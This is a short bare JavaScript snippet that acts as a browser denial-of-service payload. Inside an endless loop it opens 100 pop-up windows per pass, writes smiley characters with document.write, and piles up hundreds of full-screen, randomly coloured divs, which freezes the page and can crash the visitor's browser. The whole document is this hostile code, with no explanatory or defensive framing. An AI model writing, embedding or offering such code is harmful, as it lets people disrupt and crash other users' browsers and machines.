while (true) {
  for (let i = 0; i < 100; i++) {
    window.open();
  }
  for (let i = 0; i < 100; i++) {
    document.write("&#9786;");
  }
  for (let i = 0; i < 100; i++) {
    document.write("&#9787;");
  }
  for (let i = 0; i < 100; i++) {
    let elem = document.createElement("div");
    elem.style.width = "100%";
    elem.style.height = "100%";
    elem.style.position = "absolute";
    elem.style.top = "0";
    elem.style.left = "0";
    elem.style.backgroundColor = "rgb(" + Math.floor(Math.random() * 256) + "," + Math.floor(Math.random() * 256) + "," + Math.floor(Math.random() * 256) + ")";
    document.body.appendChild(elem);
  }
  for (let i = 0; i < 100; i++) {
    let elem = document.createElement("div");
    elem.style.width = "100%";
    elem.style.height = "100%";
    elem.style.position = "absolute";
    elem.style.top = "0";
    elem.style.left = "0";
    elem.style.backgroundColor = "rgb(" + Math.floor(Math.random() * 256) + "," + Math.floor(Math.random() * 256) + "," + Math.floor(Math.random() * 256) + ")";
    document.body.appendChild(elem);
  }
}
